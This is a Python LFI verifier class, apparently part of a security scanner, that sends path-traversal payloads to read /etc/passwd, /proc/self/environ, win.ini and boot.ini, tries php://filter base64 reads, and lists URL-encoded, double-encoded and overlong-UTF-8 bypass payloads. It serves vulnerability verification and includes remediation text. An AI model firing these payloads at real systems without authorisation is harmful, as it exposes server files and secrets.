#!/usr/bin/env python3
"""
LFI Verifier
============
Multi-stage:
  Stage 1: Linux /etc/passwd traversal
  Stage 2: Windows win.ini traversal
  Stage 3: PHP wrapper (php://filter)
  Stage 4: Encoding bypass (URL-encoded, double-encoded)
"""
import re
import base64

from ..base_verifier import BaseVerifier
from ..models import VerifiedFinding, VerificationEvidence


class LFIVerifier(BaseVerifier):
    VULN_TYPE = "LFI"
    VULN_TITLE = "Local File Inclusion"
    DEFAULT_SEVERITY = "high"
    DEFAULT_CWE = "CWE-22"
    DEFAULT_CVSS = 7.5
    DEFAULT_CVSS_VECTOR = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    DEFAULT_REMEDIATION = (
        "Never use user input directly in file paths. Use an allowlist of "
        "permitted files or a mapping table. Validate input against "
        "canonical paths (realpath). Disable dangerous PHP wrappers."
    )

    LINUX_TARGETS = [
        ("/etc/passwd", [
            (r"root:.*?:0:0:", "Root entry in /etc/passwd"),
            (r"daemon:.*?:1:1:", "Daemon entry"),
            (r"nobody:.*?:65534:65534:", "Nobody entry"),
        ]),
        ("/etc/hosts", [(r"127\.0\.0\.1\s+localhost", "Localhost entry")]),
        ("/etc/hostname", [(r"^[a-zA-Z0-9][a-zA-Z0-9\-]+$", "Hostname")]),
        ("/proc/self/environ", [
            (r"HTTP_USER_AGENT=", "HTTP_USER_AGENT env var"),
            (r"PATH=/", "PATH env var"),
        ]),
        ("/proc/version", [(r"Linux version \d+\.\d+", "Kernel version")]),
    ]

    WINDOWS_TARGETS = [
        ("/windows/win.ini", [
            (r"\[fonts\]", "[fonts] section"),
            (r"\[extensions\]", "[extensions] section"),
        ]),
        ("/windows/system.ini", [
            (r"\[386enh\]", "[386enh] section"),
            (r"\[boot\]", "[boot] section"),
        ]),
        ("/boot.ini", [
            (r"\[boot loader\]", "[boot loader] section"),
            (r"\[operating systems\]", "[operating systems] section"),
        ]),
    ]

    def verify(self, url, param, method="GET", form_data=None):
        self.steps = []
        all_evidence = []
        extracted_info = {}
        key_exchange = None
        confidence = 0.0

        # ── Linux traversal ──────────────────────────────────────────────
        for target, patterns in self.LINUX_TARGETS:
            step = self.start_step(
                f"traversal_{target.replace('/', '_')}",
                f"Attempting to read {target}",
                stage="detection",
            )
            found = False
            for depth in [3, 5, 8, 12]:
                payload = "../" * depth + target.lstrip("/")
                ex = self.inject(url, param, payload, method, form_data)
                if not ex or ex.response_status == 0:
                    continue
                for pattern, desc in patterns:
                    m = re.search(pattern, ex.response_body or "", re.I | re.M)
                    if m:
                        ev = VerificationEvidence(
                            type="file_content",
                            title=f"File {target} read successfully",
                            description=desc,
                            payload=payload,
                            extracted_data={
                                "file": target,
                                "content": m.group(0)[:300],
                            },
                            raw_match=m.group(0)[:300],
                            exchange=ex,
                            confidence=0.95,
                        )
                        all_evidence.append(ev)
                        extracted_info[target] = m.group(0)[:300]
                        self.finish_step(
                            step, "passed",
                            payload=payload,
                            details=f"Read {target} (depth {depth})",
                            evidence=[ev],
                        )
                        confidence = 0.95
                        key_exchange = ex
                        found = True
                        break
                if found:
                    break
            if not found:
                self.finish_step(step, "failed",
                                details=f"Could not read {target}")
            else:
                break

        # ── Windows traversal ────────────────────────────────────────────
        if confidence < 0.9:
            for target, patterns in self.WINDOWS_TARGETS:
                step = self.start_step(
                    f"traversal_{target.replace('/', '_')}",
                    f"Attempting to read {target}",
                    stage="detection",
                )
                found = False
                for depth in [3, 5, 8]:
                    payload = ("..\\" * depth +
                              target.lstrip("/").replace("/", "\\"))
                    ex = self.inject(url, param, payload, method, form_data)
                    if not ex or ex.response_status == 0:
                        continue
                    for pattern, desc in patterns:
                        m = re.search(pattern, ex.response_body or "", re.I)
                        if m:
                            ev = VerificationEvidence(
                                type="file_content",
                                title=f"File {target} read",
                                description=desc,
                                payload=payload,
                                extracted_data={
                                    "file": target,
                                    "content": m.group(0)[:300],
                                },
                                exchange=ex,
                                confidence=0.95,
                            )
                            all_evidence.append(ev)
                            extracted_info[target] = m.group(0)[:300]
                            self.finish_step(step, "passed", payload=payload,
                                            details=f"Read {target}",
                                            evidence=[ev])
                            confidence = 0.95
                            key_exchange = ex
                            found = True
                            break
                    if found:
                        break
                if found:
                    break

        # ── PHP filter wrapper ───────────────────────────────────────────
        if confidence < 0.9:
            step = self.start_step(
                "php_filter_wrapper",
                "Testing php://filter base64 encoding",
                stage="detection",
            )
            payload = ("php://filter/convert.base64-encode/resource="
                      "/etc/passwd")
            ex = self.inject(url, param, payload, method, form_data)
            if ex and ex.response_status:
                m = re.search(r"[A-Za-z0-9+/]{60,}={0,2}",
                             ex.response_body or "")
                if m:
                    try:
                        decoded = base64.b64decode(m.group(0)).decode(
                            "utf-8", "ignore"
                        )
                        if "root:" in decoded:
                            ev = VerificationEvidence(
                                type="php_filter",
                                title="PHP filter wrapper LFI",
                                description=(
                                    "File read via php://filter — attacker "
                                    "can read any file the server has access to."
                                ),
                                payload=payload,
                                extracted_data={
                                    "file": "/etc/passwd",
                                    "decoded_sample": decoded[:300],
                                },
                                exchange=ex,
                                confidence=0.98,
                            )
                            all_evidence.append(ev)
                            extracted_info["php_filter"] = decoded[:300]
                            self.finish_step(
                                step, "passed", payload=payload,
                                details="Base64-decoded /etc/passwd",
                                evidence=[ev],
                            )
                            confidence = 0.98
                            if not key_exchange:
                                key_exchange = ex
                    except Exception:
                        pass
            if confidence < 0.9:
                self.finish_step(step, "failed",
                                details="PHP filter wrapper not exploitable")

        # ── Encoding bypass ──────────────────────────────────────────────
        if confidence < 0.9:
            step = self.start_step(
                "encoding_bypass",
                "Testing URL-encoded traversal",
                stage="detection",
            )
            bypass_payloads = [
                "..%2f" * 8 + "etc%2fpasswd",
                "%2e%2e%2f" * 8 + "etc%2fpasswd",
                "..%252f" * 8 + "etc%252fpasswd",
                "....//" * 8 + "etc/passwd",
                "..%c0%af..%c0%af..%c0%afetc/passwd",
            ]
            for payload in bypass_payloads:
                ex = self.inject(url, param, payload, method, form_data)
                if not ex or ex.response_status == 0:
                    continue
                m = re.search(r"root:.*?:0:0:", ex.response_body or "")
                if m:
                    ev = VerificationEvidence(
                        type="file_content_bypass",
                        title="LFI via encoding bypass",
                        description="Traversal succeeded despite encoding",
                        payload=payload,
                        raw_match=m.group(0)[:300],
                        exchange=ex,
                        confidence=0.9,
                    )
                    all_evidence.append(ev)
                    extracted_info["bypass"] = m.group(0)[:300]
                    self.finish_step(step, "passed", payload=payload,
                                    details="Encoding bypass worked",
                                    evidence=[ev])
                    confidence = 0.9
                    if not key_exchange:
                        key_exchange = ex
                    break
            if confidence < 0.9:
                self.finish_step(step, "failed",
                                details="Encoding bypass failed")

        # ── Final ────────────────────────────────────────────────────────
        if confidence >= 0.85:
            methods = [s.name for s in self.steps if s.status == "passed"]
            return self.build_finding(
                url=url, param=param,
                confidence=confidence,
                description=(
                    f"Local File Inclusion verified. "
                    f"Read {len(extracted_info)} file(s)."
                ),
                methods=methods,
                extracted_info=extracted_info,
                key_exchange=key_exchange,
            )
        return None